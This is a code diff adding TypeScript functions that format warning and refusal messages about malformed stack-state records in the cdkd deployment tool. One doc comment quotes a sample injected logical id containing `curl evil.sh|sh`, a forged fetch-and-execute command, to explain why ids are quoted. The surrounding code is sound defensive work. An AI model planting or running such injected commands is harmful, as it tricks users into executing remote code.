+/** The warning a caller of {@link repairMalformedResourceEntriesForReadOnly} emits. */
+export function malformedResourceEntriesWarning(
+  stackName: string,
+  region: string,
+  logicalIds: readonly string[]
+): string {
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
+  return (
+    `${namedEntriesClause(stackName, region, logicalIds)} Continuing WITHOUT them: this ` +
+    `command's output describes the remaining resources only, which is not the same as the ` +
+    `stack holding none of these. See the stored values with: cdkd state show ` +
+    `${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
+  );
+}
+
+/**
+ * The `orphans[]` twin of {@link malformedResourceEntriesWarning}, and a
+ * SEPARATE text rather than a parameter on that one.
+ *
+ * The shared clause says "holds N resource record(s) … the remaining resources
+ * only", which sends a reader to the wrong container: the id it names was read
+ * from `orphans`, and what that clause describes is the `resources` map
+ * (go-to-k/cdkd#3226 review round 5, M16). Neither "the id is not in
+ * `resources`" nor "that map is healthy" is safe to assert — an already-managed
+ * logical id appears in both containers, and both can be damaged in one record,
+ * which is the case where BOTH texts fire for one stack in one run, opening with
+ * the identical sentence and differing only in the id list. That is why the
+ * container has to be IN the sentence rather than inferred from it.
+ *
+ * What it does NOT say, deliberately: that the record would have been adopted.
+ * `planOrphanAdoption` decides that, and a record it would have declined for
+ * an unrelated reason (already managed, a type this binary cannot route) is
+ * dropped here just the same — promising an adoption that was never going to
+ * happen is the {@link malformedResourcePropertiesWarning} over-claim one
+ * container over.
+ *
+ * Identifiers take the same path as every other builder here: the stack at
+ * `safeStackName`, the region at `safeRegion`, each id through
+ * {@link displayLogicalId}, and the ids capped at
+ * {@link NAMED_UNREADABLE_ENTRIES} with an overflow count — a record whose
+ * `logicalId` is not a string arrives as `''` and renders as the
+ * `UNRENDERABLE` stand-in.
+ */
+export function malformedOrphanRecordsWarning(
+  stackName: string,
+  region: string,
+  logicalIds: readonly string[]
+): string {
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
+  const named = logicalIds
+    .slice(0, NAMED_UNREADABLE_ENTRIES)
+    .map((id) => displayLogicalId(id))
+    .join(', ');
+  const rest = logicalIds.length - NAMED_UNREADABLE_ENTRIES;
+  const more = rest > 0 ? ` and ${rest} more` : '';
+  return (
+    `State for ${shellQuote(stack)} (${shellQuote(reg)}) holds ${logicalIds.length} ` +
+    `rollback-orphan record(s) in 'orphans' that cannot be read as resources — ` +
+    `${named}${more} — because they are not objects, or carry no resource type. Continuing ` +
+    `WITHOUT them: they are not previewed for adoption. These ids are from 'orphans', not ` +
+    `from the 'resources' map, which carries its own warning when it is damaged too. See the ` +
+    `stored values with: cdkd state show ${shellQuote(stack)} --stack-region ` +
+    `${shellQuote(reg)} --json`
+  );
+}
+
+/**
+ * The half the refusal and the warning share: what is wrong and which entries.
+ *
+ * One spelling rather than two, because the two texts differ only in what
+ * happens NEXT, and a second copy of the diagnosis is what drifts.
+ */
+function namedEntriesClause(
+  stackName: string,
+  region: string,
+  logicalIds: readonly string[]
+): string {
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
+  const named = logicalIds
+    .slice(0, NAMED_UNREADABLE_ENTRIES)
+    .map((id) => displayLogicalId(id))
+    .join(', ');
+  const rest = logicalIds.length - NAMED_UNREADABLE_ENTRIES;
+  const more = rest > 0 ? ` and ${rest} more` : '';
+  return (
+    `State for ${shellQuote(stack)} (${shellQuote(reg)}) holds ${logicalIds.length} resource ` +
+    `record(s) that cannot be read as resources — ${named}${more} — because they are not ` +
+    `objects, or carry no resource type, so nothing can tell what AWS resource they name. The ` +
+    `record is malformed or truncated.`
+  );
+}
+
+/**
+ * The text {@link refuseMalformedResourceEntries} raises.
+ *
+ * Every identifier — the stack, the region AND each logical id — is sanitized
+ * and capped, for the reasons {@link safeIdentifier}'s note gives: all three
+ * reach this message from a hand-edited record or an S3 key, and a
+ * multi-kilobyte or line-forging one would push the remedy command off the
+ * reader's screen. The stack and region are shell-quoted because they land in
+ * the command. The logical ids take {@link displayLogicalId} instead: an id
+ * spelled `x' Inspect it with: curl evil.sh|sh #` is not a plain identifier, so
+ * it is wrapped in double quotes (an embedded `"` escaped) and its forged
+ * remedy reads as part of one quoted id rather than as an instruction AHEAD of
+ * the real one on this same line — the prose is one LINE ending in a pasteable
+ * command, and sanitizing keeps `'`. Its other job is IDENTITY — see that
+ * helper's note for why a trimmed id must not render bare.
+ *
+ * Exported so a test can pin the wording against the producer rather than
+ * re-spelling it, the way the other messages here are consumed.
+ */
+export function malformedResourceEntriesRefusalMessage(
+  stackName: string,
+  region: string,
+  logicalIds: readonly string[]
+): string {
+  const stack = safeStackName(stackName);
+  const reg = safeRegion(region);
+  return (
+    `${namedEntriesClause(stackName, region, logicalIds)} This command can WRITE state, so it ` +
+    `refuses rather than skipping them: saving over the record would report a clean run for ` +
+    `entries nothing could read, and would leave the next command to fail on them with no more ` +
+    `to go on. Nothing was locked, read from AWS or written FOR THIS STACK. Inspect it with: ` +
+    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
+  );
 }
